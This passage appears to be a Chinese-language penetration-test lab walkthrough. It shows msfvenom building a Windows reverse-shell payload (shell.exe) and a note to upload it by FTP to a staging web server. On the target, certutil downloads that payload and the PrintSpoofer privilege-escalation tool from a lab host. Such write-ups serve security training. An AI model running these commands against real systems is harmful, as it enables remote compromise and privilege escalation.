/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: previous definition of NAME was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::PREFERENCE
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: previous definition of PREFERENCE was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::IDENTIFIER
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: previous definition of IDENTIFIER was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: previous definition of NAME was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::PREFERENCE
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: previous definition of PREFERENCE was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::IDENTIFIER
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: previous definition of IDENTIFIER was here
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

將其透過 ftp 傳到 147 的 wwwroot/

148:
```json
PS C:\Users\Public\Downloads> certutil.exe -urlcache http://10.10.92.147:8000/PrintSpoofer64.exe PrintSpoofer64.exe
PS C:\Users\Public\Downloads>
PS C:\Users\Public\Downloads>
http://10.10.92.147:8000/PrintSpoofer64.exe

WinHttp Cache entries: 1

****  OFFLINE  ****


CertUtil: -URLCache command completed successfully.
PS C:\Users\Public\Downloads> ls
PS C:\Users\Public\Downloads>
PS C:\Users\Public\Downloads>


    Directory: C:\Users\Public\Downloads


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          8/9/2023   7:33 AM          27293 PrintSpoofer64.exe


PS C:\Users\Public\Downloads> certutil.exe -urlcache http://10.10.92.147:8000/shell.exe shell.exe
PS C:\Users\Public\Downloads>
PS C:\Users\Public\Downloads>


****  OFFLINE  ****


CertUtil: -URLCache command completed successfully.
```

